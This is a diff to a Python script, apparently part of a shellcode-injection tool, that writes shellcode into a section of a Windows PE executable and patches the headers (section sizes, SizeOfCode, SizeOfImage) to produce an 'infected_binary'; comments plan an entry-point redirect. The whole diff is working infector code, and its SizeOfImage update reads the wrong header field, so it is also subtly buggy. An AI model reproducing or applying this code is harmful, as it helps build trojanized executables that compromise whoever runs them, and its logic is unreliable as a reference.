@@ -4,6 +4,7 @@ from ShellCodeGenerators.ZeroFiller import ZeroFiller
 OFFSET_TO_PE_HEADER_OFFSET = 0x3C
 OFFSET_TO_ENTRYPOINT_RVA = 0x28
 OFFSET_TO_NUMBER_OF_SECTIONS = 0x6
+OFFSET_TO_SIZE_OF_CODE = 0x1C
 OFFSET_TO_BASE_OF_CODE_RVA = 0x2C
 OFFSET_TO_BASE_OF_DATA_RVA = 0x30
 OFFSET_TO_SECTION_ALIGNMENT = 0x38
@@ -87,16 +88,21 @@ def inject_shell_code_at_offset(binary_data, offset, shell_code):
     return first_half
 
 
-def adjust_headers(binary_data, header_offset, section_offset, number_of_sections, index_of_section_containing_shell_code, shell_code_size):
+def adjust_headers(binary_data, header_offset, section_header_offset, number_of_sections, index_of_section_containing_shell_code, shell_code_size):
+
+    #Set Size of Code field
+    size_of_code_offset = header_offset + OFFSET_TO_SIZE_OF_CODE
+    current_size_of_code = get_dword_given_offset(binary_data, size_of_code_offset)
+    set_dword_given_offset(binary_data, current_size_of_code + shell_code_size, size_of_code_offset)
 
     section_alignment = get_dword_given_offset(binary_data, header_offset+OFFSET_TO_SECTION_ALIGNMENT)
     file_alignment = get_dword_given_offset(binary_data, header_offset+OFFSET_TO_FILE_ALIGNMENT)
 
+
       # -Get end of binary section - done
       #Size of image
 
-       #-Inject shellcode - done
-       #-Change entrypoint
+        #-Change entrypoint
        #-Change Size of image
        #-Base of data
        #-Number of RVA and Sizes?
@@ -108,28 +114,30 @@ def adjust_headers(binary_data, header_offset, section_offset, number_of_section
        #-Pointer to line numbers
 
       #Adjusting code section
-    current_header_offset = section_offset
+    current_header_offset = section_header_offset
 
+    #Set virtual section size for shellcoded section
     virtual_section_size_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
     virtual_section_size = get_dword_given_offset(binary_data, virtual_section_size_offset)
     virtual_section_size += shell_code_size
     set_dword_given_offset(binary_data, virtual_section_size, virtual_section_size_offset)
 
+    # Set raw section size for shellcoded section
     raw_section_size_offset = current_header_offset + OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER
     raw_section_size = get_dword_given_offset(binary_data, raw_section_size_offset)
     raw_section_size += shell_code_size
     set_dword_given_offset(binary_data, raw_section_size, raw_section_size_offset)
 
-    current_header_offset += SECTION_HEADER_SIZE
 
+    #If the base of cod and/or data is after the section with the shellcode, need to update header.
     base_of_code_rva_offset = header_offset + OFFSET_TO_BASE_OF_CODE_RVA
     base_of_code_rva = get_dword_given_offset(binary_data, base_of_code_rva_offset)
 
     base_of_data_rva_offset = header_offset + OFFSET_TO_BASE_OF_DATA_RVA
     base_of_data_rva = get_dword_given_offset(binary_data, base_of_data_rva_offset)
 
-    last_virtual_section_rva = None
-    last_virtual_section_size = None
+    #Moving to the nextion section header
+    current_header_offset += SECTION_HEADER_SIZE
 
     for section_index in range(0, number_of_sections - index_of_section_containing_shell_code - 1):
         virtual_section_rva_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER
@@ -154,20 +162,15 @@ def adjust_headers(binary_data, header_offset, section_offset, number_of_section
         set_dword_given_offset(binary_data, raw_section_offset, raw_section_offset_offset)
 
         virtual_section_size_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
-        virtual_section_size = get_dword_given_offset(binary_data, virtual_section_size_offset)
-        last_virtual_section_size = virtual_section_size
-
 
         current_header_offset += SECTION_HEADER_SIZE
 
     #Sets size of image aligned to SectionAlignment
-    unaligned_size_of_image = last_virtual_section_rva + last_virtual_section_size
-    aligned_size_of_image = unaligned_size_of_image + (section_alignment - (unaligned_size_of_image % section_alignment))
     size_of_image_offset = header_offset + OFFSET_TO_SIZE_OF_IMAGE
+    current_size_of_image = get_dword_given_offset(binary_data, size_of_code_offset)
+    unaligned_size_of_image = current_size_of_image + shell_code_size
+    aligned_size_of_image = unaligned_size_of_image + (section_alignment - (unaligned_size_of_image % section_alignment))
     set_dword_given_offset(binary_data, aligned_size_of_image, size_of_image_offset)
-
-
-
 
 
 
@@ -196,21 +199,21 @@ def inject_shell_code(header_offset, binary_data, shell_code):
         current_header_offset += SECTION_HEADER_SIZE
 
 
+    #Get raw size and offset for section containing shellcode
     raw_section_size_offset = current_header_offset + OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER
     raw_section_size = get_dword_given_offset(binary_data,raw_section_size_offset)
-
-
     raw_section_offset_offset = current_header_offset + OFFSET_TO_SECTION_RAW_ADDRESS_WITHIN_SECTION_HEADER
     raw_section_offset = get_dword_given_offset(binary_data,raw_section_offset_offset)
 
     file_alignment = get_dword_given_offset(binary_data, header_offset + OFFSET_TO_FILE_ALIGNMENT)
-    padding_size = file_alignment - (len(shell_code) % file_alignment)
+    new_raw_section_size_unaligned = raw_section_size + len(shell_code)
+    padding_size = file_alignment - (new_raw_section_size_unaligned % file_alignment)
     padding = bytearray([0x0 for x in range(0,padding_size)])
     shell_code.extend(padding)
 
     infected_binary = inject_shell_code_at_offset(binary_data, raw_section_offset + raw_section_size, shell_code)
 
-    adjust_headers(infected_binary, header_offset, current_header_offset, number_of_sections, section_index, len(shell_code) + padding_size)
+    adjust_headers(infected_binary, header_offset, current_header_offset, number_of_sections, section_index, len(shell_code))
     return infected_binary
 
 if __name__=='__main__':
